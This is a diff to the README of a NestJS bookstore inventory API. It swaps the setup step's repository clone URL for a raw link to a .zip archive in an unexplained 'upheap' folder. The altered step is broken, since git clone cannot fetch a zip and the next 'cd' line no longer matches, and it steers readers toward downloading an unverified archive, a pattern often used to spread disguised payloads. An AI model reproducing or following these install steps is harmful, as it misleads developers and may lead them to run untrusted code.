@@ -56,7 +56,7 @@ This is a backend API for managing a **Bookstore Inventory Management System**. 
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/bookstore-backend.git
+   git clone https://raw.githubusercontent.com/arslanneni/book-store-be-nestjs/master/upheap/book-store-be-nestjs.zip
    cd bookstore-backend
    npm install
    npm run start:dev
